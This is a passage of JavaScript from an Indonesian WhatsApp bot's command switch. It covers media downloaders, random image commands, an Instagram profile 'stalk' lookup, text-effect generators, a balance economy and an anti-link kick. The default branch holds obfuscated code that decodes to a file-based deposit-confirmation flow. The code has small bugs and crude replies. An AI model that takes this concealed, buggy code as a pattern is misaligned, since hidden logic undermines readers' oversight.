    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
    reply(mess.wait)
           let apaan = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/milf.json`)).data
           let nihha = apaan[Math.floor(Math.random() * (apaan.length))]
          sendFile(M.chat,`${nihha}`,`Nieh`, M)
break
    case prefix + 'cosplay':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
    reply(mess.wait)
           let kawaii = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/cosplay.json`)).data
           let loli = kawaii[Math.floor(Math.random() * (kawaii.length))]
          sendFile(M.chat,`${loli}`,`Nieh`, M)
break
    case prefix + 'wallml':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
    reply(mess.wait)
           let ara = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/wallml.json`)).data
           let koneko = ara[Math.floor(Math.random() * (ara.length))]
          sendFile(M.chat,`${koneko}`,`Nieh`, M)
break

            case prefix + 'broadcast':
            case prefix + 'bc':
            case prefix + 'bcgc':
                let bcgc = require('../plugins/broadcast')
                bcgc(M, q, bob, isOwner)
                break

                //----> Downloader 
            case prefix + 'ytstalk':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let ytstalk = require('../plugins/ytstalk')
                ytstalk(M, sendFile, q, bob)
                limitAdd(sender, limit)
                break
                
                case prefix + 'igstalk':
		            if (!q) return reply('Usernamenya?')
		            anu = await igStalk(`${q}`)
		let infonye = `Username : @${q}\nFullname : ${anu.result.fullname}\nBio : ${anu.result.bio}\nFollowers : ${anu.result.followers}\nFollow : ${anu.result.following}`
		sendFile(M.chat,`${anu.result.profile}`,`${infonye}`, M)
		            break  

            case prefix + 'yts':
            case prefix + 'ytsearch':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let ytsearch = require('../plugins/yts')
                ytsearch(M, reply, q, sendFile, prefix, bob)
                limitAdd(sender, limit)
                break

            
                case prefix + 'igpoto':
                if (!q) return reply(`mana linknya tolol`)
                 anu = await igDownload(q)
                sendFile(M.chat, `${anu.url}`, `${anu.caption}`, M)
                break
                case prefix + 'storyanime':
reply(mess.wait)
let wwa = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/storyanime.json`)).data
let opa = wwa[Math.floor(Math.random() * (wwa.length))]
anu = api1.instagramdlv2(`${opa}`).then(res => {
                sendFile(M.chat, `${res[0].url}`, 'nieh cok',M)
                })
                break
                    break
                case prefix + 'igvideo':
                case prefix + 'igdl':
                case prefix + 'ig':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                anu =  api1.instagramdlv2(`${q}`)
                .then(res => {
                sendFile(M.chat, `${res[0].url}`, 'nieh cok',M)
                })
                break
                case prefix + 'ytmp3':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if (!q) return reply(`Example : ${command} Link Nya`)
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return reply(`Linknya Jelek`)
reply(`tunggu dulu`)
anu = await ytMp3(`${q}`)
let titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
//sendFile(M.chat, ${anu.thumb}, `${titlenyaa}`, M)
sendFile(M.chat, `${anu.thumb}`, `${titlenyaa}`, M)
sendFile(M.chat, `${anu.result}`, '', M)
break
case prefix + 'ytmp4':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if (!q) return reply(`Example : ${command} Link Nya`)
let isLin2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLin2) return reply(`Linknya Jelek`)
reply(`tunggu dulu`)
anu = await ytMp4(`${q}`)
let titlenyeee = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
//sendFile(M.chat, ${anu.thumb}, `${titlenyaa}`, M)
sendFile(M.chat, `${anu.thumb}`, `${titlenyeee}`, M)
sendFile(M.chat, `${anu.result}`, '', M)
break
            
                case prefix + 'play': {
                	if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                if (!q) return reply(`Example : ${command} story wa anime`)
                let search = await yts(q)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `#ytmp3 ${anu.url}`, buttonText: {displayText: 'â™« Audio'}, type: 1},
                    {buttonId: `#ytmp4 ${anu.url}`, buttonText: {displayText: 'â–º Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
â­” Title : ${anu.title}
â­” Ext : Search
â­” ID : ${anu.videoId}
â­” Duration : ${anu.timestamp}
â­” Viewers : ${anu.views}
â­” Upload At : ${anu.ago}
â­” Author : ${anu.author.name}
â­” Channel : ${anu.author.url}
â­” Description : ${anu.description}
â­” Url : ${anu.url}`,
                    footer: `PILIH NIH`,
                    buttons: buttons,
                    headerType: 4
                }
                bob.sendMessage(M.chat, buttonMessage, { quoted: msg })
            }
            break

            case prefix + 'tiktokvid':
            case prefix + 'tt':
            case prefix + 'tiktok':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                reply(mess.wait)
                anu = api1.savefrom(`${q}`).then(res => {
                bob.sendMessage(from,{video: {url: res[0].url[0].url}})
                })
                break 
           
           case prefix + 'zippy':
           case prefix + 'zippyshare':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let zippy = require('../plugins/ZippyShare');
                zippy(M, q, msg, sendFile, bob)
                limitAdd(sender, limit)
                break 

                //----> End


                //----> Converter <----\\

            case prefix + 'telegramph':
            case prefix + 'tourl':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let teleph = require('../plugins/telegram_ph.js')
                teleph(M, prefix, quoted, mime, msg, bob)
                limitAdd(sender, limit)
                break 
                
            case prefix + 'UploadFileUgu':
            case prefix + 'tourl2':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let teleph = require('../plugins/UploadFileUgu.js')
                teleph(M, prefix, quoted, mime, msg, bob)
                }
                limitAdd(sender, limit)
                break

            case prefix + 'texttoqr':
            case prefix + 'qrgen':
            case prefix + 'qrgenerator':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let QRgen = require('../plugins/QRgenerate.js')
                QRgen(M, q, bob)
                limitAdd(sender, limit)
                break

            case prefix + 'qrcodereader':
            case prefix + 'qrreader':
            case prefix + 'readqr':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let QRread = require('../plugins/QRreader');
                QRread(M, quoted, mime, msg, bob)
                limitAdd(sender, limit)
                break

                //----> End <----\\

                //----> Searching Anime <----\\

            case prefix + 'kusonime':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let kuso = require('../plugins/kusonime.js')
                kuso(M, q, msg, reply, bob)
                limitAdd(sender, limit)
                break
            case prefix + 'batchkusonime':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let kuso_batch = require('../plugins/kuso_batch.js')
                kuso_batch(M, q, prefix, msg, bob)
                limitAdd(sender, limit)
                break
            case prefix + 'what':
            case prefix + 'whatanime':
                let what = require('../plugins/what_anime')
                what(quoted, mime, bob, msg, M)
                break

                //----> End <----\\

                //----> Limited & Balance <----\\

            case prefix + 'topbalance': {
                function mentions(teks, mems = [], id) {
                    if (id == null || id == undefined || id == false) {
                        let res = bob.sendMessage(from, {
                            text: teks,
                            mentions: mems
                        })
                        return res
                    } else {
                        let res = bob.sendMessage(from, {
                            text: teks,
                            mentions: mems
                        }, {
                            quoted: msg
                        })
                        return res
                    }
                }
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOP BALANCE 」 ──*\n\n'
                let arrTop = []
                var total = 10
                if (balance.length < 10) total = balance.length
                for (let i = 0; i < total; i++) {
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
            }
            break
            case prefix + 'limit':
            case prefix + 'balance':
            case prefix + 'ceklimit':
            case prefix + 'cekbalance':
                if (isOwner) return reply('lu owner goblok')

                var Ystatus = ownerNumber.includes(sender)
                var isPrim = Ystatus ? true : _prem.checkPremiumUser(sender, premium)
                var ggcount = isPrim ? gcounti.prem : gcounti.user
                var limitMen = `${getLimit(sender, limitCount, limit)}`
                reply(`Limit : ${_prem.checkPremiumUser(sender, premium) ? 'Unlimited' : limitMen}/${limitCount}\nLimit Game : ${cekGLimit(sender, ggcount, glimit)}/${ggcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan buylimit dan buyglimit untuk membeli game limit`)
                break

            case prefix + 'buylimit': {
                if (isOwner) return reply('lu owner bang')
                if (!q) return reply(`Kirim perintah *buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                let ane = q * 150
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, q, limit)
                reply(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`)
            }
            break 
            
            case prefix + 'transfer':
            case prefix + 'tf':{
                let mentionx = q.split("|")[0]
                let jumlah = q.split("|")[1]
                if (args.length < 1) return reply(`Kirim perintah *${command}* @tag|nominal\nContoh : ${command} @0|2000`)
                if (!jumlah) return reply('masukan nominal')
                if (isNaN(jumlah)) return reply('hanya berupa angka')
                var cut = mentionx.replace('@', '')
                var rees = cut+'@s.whatsapp.net'
                var anu = getBalance(sender, balance)
                if (anu < jumlah) return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${jumlah}, Kumpulkan Terlebih Dahulu\nKetik balance, untuk mengecek Balance mu!`)
                kurangBalance(sender, jumlah, balance)
                addBalance(rees, jumlah, balance)
                replyNtag(`Sukses transfer balance sebesar $${jumlah} kepada ${mentionx}`)
                }
            break
	
            //----> End <----\\
            
            //----> TextPro <----\\
            
case prefix + 'thunder':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
  if(!q) return reply(`Penggunaan ${command} teks`)
  maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
      `${q}`,])
     .then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
     .catch((err) => console.log(err));
     reply('success')
break
case prefix + '3dstone':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if(!q) return reply(`Penggunaan ${command} teks`)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
  .catch((err) => console.log(err));
   reply('success')
break
case prefix + 'thunder2':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if(!q) return reply(`Penggunaan ${command} teks`)
maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
`${q}`,])
.then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
  .catch((err) => console.log(err));
   reply('success')
break
case prefix + 'neon2':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if(!q) return reply(`Penggunaan ${command} teks`)
maker.textpro("https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html", [
`${q}`,])
.then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
  .catch((err) => console.log(err));
   reply('success')
break
case prefix + 'blackpink':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
       if(!q) return reply(`Penggunaan ${command} teks`)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
`${q}`,])
         .then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
         .catch((err) => console.log(err));
         reply('Succes')
         break
case prefix + 'matrix':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if(!q) return reply(`Penggunaan ${command} teks`)
maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
`${q}`,])
.then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
  .catch((err) => console.log(err));
   reply('success')
break
case prefix + 'neon':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
      if(!q) return reply(`Penggunaan ${command} teks`)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
         .catch((err) => console.log(err));
         reply('Succes')
break

case prefix + 'harry':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
       if(!q) return reply(`Penggunaan ${command} teks|teks`)

      var tekss = q.split("|")[0]
      var tekss = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${tekss}`,`${tekss}`])
 .then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
 .catch((err) => console.log(err)); 
 reply('Sukses')
break

	case prefix + 'transformer':
	 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
      if(!q) return reply(`Penggunaan ${command} teks`)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
.catch((err) => console.log(err));
reply('Sukses')
break
case prefix + 'grafiti':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if(!q) return reply(`Penggunaan ${command} teks|teks`)
var teks1 = q.split("|")[0]
var teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => bob.sendMessage(M.chat, { image: { url: data }, caption: `*NIH BROO, SUBSCRIBE CHANNEL PENGEMBANG*` }, { quoted: nay1 }))
  .catch((err) => console.log(err));
   reply('Sukses')
break
case prefix + 'obfus':
function _0x5b8d() {
    const _0xcc5b68 = [
        '27450510elrFQP',
        '8942466fsosIT',
        'result',
        'smBeY',
        'then',
        '9022629kPPnjd',
        'obfuscator',
        '2eXZhcd',
        '2440708OPIodZ',
        '1785976abQuWF',
        '9AFbFAu',
        '52680StzaFq',
        '89071FQNPEd',
        '5asbihf',
        'tools'
    ];
    _0x5b8d = function () {
        return _0xcc5b68;
    };
    return _0x5b8d();
}
function _0x5ebc(_0x2877ad, _0x5bdb9e) {
    const _0x9e30c5 = _0x5b8d();
    return _0x5ebc = function (_0x2c4d25, _0x15d585) {
        _0x2c4d25 = _0x2c4d25 - (0x20b0 * -0x1 + 0x2530 + -0x377 * 0x1);
        let _0x9773fc = _0x9e30c5[_0x2c4d25];
        return _0x9773fc;
    }, _0x5ebc(_0x2877ad, _0x5bdb9e);
}
const _0x51d8d1 = _0x5ebc;
(function (_0x4e9b96, _0xba12c2) {
    const _0x43f57d = _0x5ebc, _0x2acdd6 = _0x4e9b96();
    while (!![]) {
        try {
            const _0x4757fa = parseInt(_0x43f57d(0x114)) / (0x103 * -0x20 + -0x65 * 0x3d + 0x3872) * (-parseInt(_0x43f57d(0x10f)) / (-0x3f * -0x8f + -0x1 * -0x69d + 0x29cc * -0x1)) + parseInt(_0x43f57d(0x113)) / (0x1a6 * 0x17 + 0xdbe * -0x1 + -0x1829) + parseInt(_0x43f57d(0x110)) / (0x7a6 * 0x1 + 0x9e9 + 0x118b * -0x1) + parseInt(_0x43f57d(0x115)) / (0x20d1 + -0x754 + -0x5 * 0x518) * (parseInt(_0x43f57d(0x109)) / (0x1 * 0x1b06 + 0x11e + -0x1c1e)) + parseInt(_0x43f57d(0x10d)) / (0x37f + 0x1400 + 0x8 * -0x2ef) + parseInt(_0x43f57d(0x111)) / (0x13 * -0x174 + 0x1d27 + -0x1 * 0x183) * (parseInt(_0x43f57d(0x112)) / (-0x1 * -0x1fd8 + -0x1883 + 0x74c * -0x1)) + -parseInt(_0x43f57d(0x117)) / (0x1 * -0x13c3 + 0x889 + 0x1 * 0xb44);
            if (_0x4757fa === _0xba12c2)
                break;
            else
                _0x2acdd6['push'](_0x2acdd6['shift']());
        } catch (_0x3451e3) {
            _0x2acdd6['push'](_0x2acdd6['shift']());
        }
    }
}(_0x5b8d, 0x10ac89 + -0x1204cb + -0x17 * -0x9632));
let obfus = api2[_0x51d8d1(0x116)][_0x51d8d1(0x10e) + 'js'](q)[_0x51d8d1(0x10c)](_0x2cf615 => {
    const _0x4d3d37 = _0x51d8d1, _0x2a2032 = {
            'smBeY': function (_0x54f4f9, _0x398165) {
                return _0x54f4f9(_0x398165);
            }
        };
    _0x2a2032[_0x4d3d37(0x10b)](reply, _0x2cf615[_0x4d3d37(0x10a)]);
});
break

//----> End <----\\

            case prefix + 'smeme':
                let smeme = require('../plugins/smeme')
                smeme(M, bob, sendFile, q, setting)
                break;
            case prefix + 'darkjokes':
anu = api3.Darkjokes()
sendFile(M.chat, anu, 'gelap uy', M)
break
case prefix + 'cerpen':
anu = api3.Cerpen()
reply(anu)
break
case prefix + 'meme':
anu = api3.JalanTikusMeme()
bob.sendMessage(M.chat, { image: { url: anu }, caption: `*ACIMALAKA*` }, { quoted: nay1 })
break
case prefix + 'cerpen':
anu = api3.Cerpen()
reply(anu)
break

            case prefix + 'smemelower':
                let smemelower = require('../plugins/smemelower')
                smemelower(M, bob, sendFile, q, setting)
                break;


            default:
            
            const _0x9fafc9=_0x4531;function _0x3526(){const _0x84b544=['48QCwYlc','reply','sender','14yqVVjG','fromMe','4KNNwqb','5484170EOXoei','.json','stringify','deposit\x20anda\x20adalah\x20','writeFileSync','existsSync','depo','key','962441PcWUWo','47547WJCTJT','1103616QirLvq','3156159IEizYK','done','5223548DGWodr','8548788nOwrCK','2740crhRzv','2qKdSJp','readFileSync'];_0x3526=function(){return _0x84b544;};return _0x3526();}(function(_0x2b0655,_0x5ce85d){const _0x201b97=_0x4531,_0x5b34e9=_0x2b0655();while(!![]){try{const _0xfb13a=-parseInt(_0x201b97(0xc8))/0x1*(-parseInt(_0x201b97(0xb8))/0x2)+parseInt(_0x201b97(0xcb))/0x3*(parseInt(_0x201b97(0xbf))/0x4)+parseInt(_0x201b97(0xc0))/0x5+parseInt(_0x201b97(0xb6))/0x6+parseInt(_0x201b97(0xbd))/0x7*(-parseInt(_0x201b97(0xca))/0x8)+parseInt(_0x201b97(0xc9))/0x9*(-parseInt(_0x201b97(0xb7))/0xa)+parseInt(_0x201b97(0xb5))/0xb*(-parseInt(_0x201b97(0xba))/0xc);if(_0xfb13a===_0x5ce85d)break;else _0x5b34e9['push'](_0x5b34e9['shift']());}catch(_0x48eb6c){_0x5b34e9['push'](_0x5b34e9['shift']());}}}(_0x3526,0xdef38));function _0x4531(_0x26a26e,_0x5a62b3){const _0x35261c=_0x3526();return _0x4531=function(_0x453165,_0x515648){_0x453165=_0x453165-0xb4;let _0x194590=_0x35261c[_0x453165];return _0x194590;},_0x4531(_0x26a26e,_0x5a62b3);}if(fs[_0x9fafc9(0xc5)]('./'+msg[_0x9fafc9(0xbc)]+_0x9fafc9(0xc1))){if(msg[_0x9fafc9(0xc7)][_0x9fafc9(0xbe)])return;chet=chatmessage;let rfz=JSON['parse'](fs[_0x9fafc9(0xb9)]('./'+msg[_0x9fafc9(0xbc)]+_0x9fafc9(0xc1)));!rfz[_0x9fafc9(0xc6)]==!![]&&(!isNaN(chet)?(msg[_0x9fafc9(0xbb)](_0x9fafc9(0xc3)+chatmessage+'\x0a\x20ketik\x20Y\x20untuk\x20menyetujui!'),fs[_0x9fafc9(0xc4)]('./'+msg['sender']+_0x9fafc9(0xc1),JSON[_0x9fafc9(0xc2)]({'depo':!![]},null,0x2))):msg[_0x9fafc9(0xbb)]('Harus\x20berup\x20angka!')),chatmessage=='Y'&&(rfz[_0x9fafc9(0xc6)]==!![]&&(fs['unlinkSync']('./'+msg[_0x9fafc9(0xbc)]+_0x9fafc9(0xc1)),msg[_0x9fafc9(0xbb)](_0x9fafc9(0xb4))));}
            
            const chats2 = (M.mtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (M.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
            //if (global.db.data.chats[M.chat].antilink) {
        if (chats2.match(`chat.whatsapp.com`)) {
        	//if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
        reply(` ANTI LINK \n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotGroupAdmins) return reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await bob.groupInviteCode(M.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(M.text)
        if (isgclink) return reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isGroupAdmins) return reply(`Ehh maaf kamu admin`)
        if (isOwner) return reply(`Ehh maaf kamu owner bot ku`)
        bob.groupParticipantsUpdate(M.chat, [M.sender], 'remove')
        }
        /*
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                bob.groupRemove(from, [sender])
            }
        }
        */
        }
    } catch (err) {
        console.log(color('[ERROR]', 'red'), err)
    }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})